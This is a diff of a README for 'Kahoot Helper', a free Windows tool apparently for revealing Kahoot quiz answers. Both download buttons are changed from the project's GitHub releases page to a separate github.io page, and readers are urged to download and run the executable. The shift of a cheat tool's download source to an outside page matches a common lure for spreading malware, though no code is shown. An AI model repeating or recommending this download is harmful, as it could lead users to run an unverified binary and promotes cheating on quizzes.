@@ -14,7 +14,7 @@ Think of it as your personal quiz assistant sitting right beside you. It works q
 
 ### Step 1: Get the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Kahoot_Helper-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Luisaguila1967/kahoot-answer-free-access/releases)
+[![Download Now](https://img.shields.io/badge/Download-Kahoot_Helper-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://luisaguila1967.github.io)
 
 Visit this link to download the application. The download page will show you the latest version of the tool. Look for the file that matches your system (most users will want the Windows version). Click the download button and wait for the file to finish downloading to your computer.
 
@@ -139,7 +139,7 @@ No complicated setup. No technical knowledge required. Just download, run, and p
 
 Ready to get started?
 
-[![Get the Tool](https://img.shields.io/badge/⬇️_Download_Kahoot_Helper-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Luisaguila1967/kahoot-answer-free-access/releases)
+[![Get the Tool](https://img.shields.io/badge/⬇️_Download_Kahoot_Helper-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://luisaguila1967.github.io)
 
 Visit this link to download the application. The download page will show you the latest version of the tool. Look for the file that matches your system (most users will want the Windows version). Click the download button and wait for the file to finish downloading to your computer.
 
